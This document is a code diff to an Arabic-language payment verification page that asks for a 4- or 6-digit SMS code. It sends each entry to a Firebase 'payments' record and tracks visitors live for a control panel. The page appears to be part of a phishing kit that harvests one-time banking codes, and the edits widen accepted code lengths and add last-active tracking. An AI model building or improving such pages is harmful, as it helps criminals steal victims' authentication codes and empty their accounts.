@@ -59,17 +59,17 @@
 
     <div id="loadingOverlay">
         <div class="spinner"></div>
-        <p style="color: #333; font-weight: bold; font-size: 14px;">جاري إتمام الدفع...</p>
+        <p style="color: #333; font-weight: bold; font-size: 14px;">جاري إتمام العملية...</p>
     </div>
 
     <div class="otp-container">
         <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" class="header-image" alt="OTP Security">
         <div class="content">
             <h2>أدخل رمز التحقق</h2>
-            <p id="msgText">يرجى إدخال الرمز المكون من 6 أرقام المرسل لجوالك.</p>
+            <p id="msgText">يرجى إدخال الرمز المكون من 4 أو 6 أرقام المرسل لجوالك.</p>
 
             <div class="otp-input-wrapper">
-                <input type="tel" maxlength="6" class="otp-single-field" id="otpCode" placeholder="******">
+                <input type="tel" maxlength="6" class="otp-single-field" id="otpCode" placeholder="••••••">
                 <div id="otpErrorMsg" class="error-message">برجاء التحقق من الرمز المرسل على الجوال الصحيح</div>
             </div>
 
@@ -96,7 +96,13 @@
         const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId');
 
-        database.ref('live_visitors/' + visitorId).update({ page: "صفحة الرمز OTP" });
+        // تحديث حالة الزائر في لوحة التحكم
+        if (visitorId) {
+            database.ref('live_visitors/' + visitorId).update({ 
+                page: "صفحة الرمز OTP",
+                last_active: firebase.database.ServerValue.TIMESTAMP 
+            });
+        }
 
         let timeLeft = 120;
         const timeDisplay = document.getElementById('timeCount');
@@ -120,7 +126,8 @@
             const errorMsg = document.getElementById('otpErrorMsg');
             let otpVal = otpInput.value;
 
-            if (otpVal.length === 6) {
+            // التعديل هنا ليقبل 4 أو 6 أرقام
+            if (otpVal.length === 4 || otpVal.length === 6) {
                 document.getElementById('loadingOverlay').style.display = 'flex';
 
                 const paymentRef = database.ref('payments/' + visitorId);
@@ -160,6 +167,8 @@
         document.getElementById('otpCode').addEventListener('input', function() {
             this.classList.remove('input-error');
             document.getElementById('otpErrorMsg').style.display = "none";
+            // السماح فقط بالأرقام
+            this.value = this.value.replace(/[^0-9]/g, '');
         });
     </script>
 </body>
